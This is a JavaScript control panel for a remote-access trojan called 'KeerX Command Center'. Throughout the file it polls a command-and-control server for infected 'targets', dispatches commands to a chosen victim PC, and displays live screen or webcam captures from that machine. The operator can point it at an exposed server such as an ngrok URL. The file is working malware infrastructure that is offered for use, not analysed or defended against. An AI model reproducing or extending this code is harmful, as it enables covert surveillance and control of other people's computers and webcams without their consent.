let C2_URL = localStorage.getItem('keerx_c2_url') || "http://127.0.0.1:5000";
if (C2_URL.endsWith('/')) C2_URL = C2_URL.slice(0, -1);
let currentClientId = null;
let liveFeedInterval = null;
let feedType = "SCREEN"; // or "WEBCAM"

function log(message, type = "system") {
    const consoleLog = document.getElementById('command-log');
    if (!consoleLog) return;
    const entry = document.createElement('p');
    const timestamp = new Date().toLocaleTimeString();
    entry.className = `log-entry ${type}`;
    entry.innerHTML = `[${timestamp}] [${type.toUpperCase()}] ${message}`;
    consoleLog.appendChild(entry);
    consoleLog.scrollTop = consoleLog.scrollHeight;
}

// Client Management
async function fetchClients() {
    try {
        const response = await fetch(`${C2_URL}/clients`);
        if (!response.ok) throw new Error("Server not responding");
        const clients = await response.json();
        const list = document.getElementById('client-list');
        if (!list) return;
        list.innerHTML = '';

        Object.keys(clients).forEach(cid => {
            const client = clients[cid];
            const li = document.createElement('li');
            li.className = `client-item ${cid === currentClientId ? 'active' : ''}`;
            li.onclick = () => selectClient(cid);

            li.innerHTML = `
                <div class="client-info-small">
                    <span class="client-id">${cid}</span>
                    <span class="client-status">
                        <span class="dot ${client.status}"></span>
                        ${client.status.toUpperCase()}
                    </span>
                </div>
            `;
            list.appendChild(li);
        });

        if (Object.keys(clients).length === 0) {
            list.innerHTML = '<li class="loading">No active targets found</li>';
        }

        updateServerStatus(true);
    } catch (err) {
        updateServerStatus(false);
    }
}

function updateServerStatus(online) {
    const statusText = document.getElementById('status-text');
    const statusDot = document.querySelector('.status-dot');
    if (!statusText || !statusDot) return;

    if (online) {
        statusText.innerText = "SERVER ONLINE";
        statusDot.style.background = "#00ff41";
        statusDot.style.boxShadow = "0 0 10px #00ff41";
    } else {
        statusText.innerText = "SERVER OFFLINE";
        statusDot.style.background = "#ff3e3e";
        statusDot.style.boxShadow = "0 0 10px #ff3e3e";
    }
}

function selectClient(cid) {
    currentClientId = cid;
    document.getElementById('target-id-display').innerText = cid;
    log(`Switched target to: ${cid}`);
    fetchClients(); // Refresh list to show active state
}

// Command & Control
async function sendCommand(command) {
    if (!currentClientId) {
        log("No target selected!", "error");
        alert("Please select a target PC from the sidebar first.");
        return;
    }

    log(`Dispatching [${command}] to ${currentClientId}...`);

    try {
        const response = await fetch(`${C2_URL}/command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                command: command,
                client_id: currentClientId
            })
        });

        if (command === "LIVE_FEED_ON") startLivePlayer();
        if (command === "LIVE_FEED_OFF") stopLivePlayer();

        const data = await response.json();
        log(data.message, "system");
    } catch (err) {
        log(`C2 Error: ${err.message}`, "error");
    }
}

// Live Feed Logic
function startLivePlayer() {
    if (liveFeedInterval) clearInterval(liveFeedInterval);
    const player = document.getElementById('live-player');
    const placeholder = document.getElementById('player-placeholder');

    placeholder.style.display = 'none';
    player.style.display = 'block';

    log("Live feed starting...", "system");

    liveFeedInterval = setInterval(() => {
        if (!currentClientId) return;
        // Cache busting with timestamp
        const newSrc = `${C2_URL}/get_frame/${currentClientId}?t=${Date.now()}`;

        // Only update if the previous image finished loading to avoid flickering/queueing
        const img = new Image();
        img.onload = () => {
            player.src = newSrc;
        };
        img.src = newSrc;
    }, 1000);
}

function stopLivePlayer() {
    if (liveFeedInterval) clearInterval(liveFeedInterval);
    liveFeedInterval = null;
    document.getElementById('player-placeholder').style.display = 'block';
    document.getElementById('live-player').style.display = 'none';
}

function toggleFeedType() {
    feedType = (feedType === "SCREEN") ? "WEBCAM" : "SCREEN";
    document.getElementById('feed-toggle-btn').innerText = feedType;
    sendCommand(feedType === "WEBCAM" ? "WEBCAM_MODE" : "SCREEN_MODE");
}

function confirmCommand(command) {
    if (!currentClientId) {
        alert("Select a client first.");
        return;
    }
    if (confirm(`⚠️ DANGER: Execute ${command} on ${currentClientId}?`)) {
        sendCommand(command);
    }
}

function openConfig() {
    const newUrl = prompt("Enter your C2 Server URL (e.g., http://your-ip:5000 or Ngrok URL):", C2_URL);
    if (newUrl) {
        localStorage.setItem('keerx_c2_url', newUrl);
        location.reload();
    }
}

// Initial loops
setInterval(fetchClients, 5000);
fetchClients();
log("KeerX Command Center initialized.");
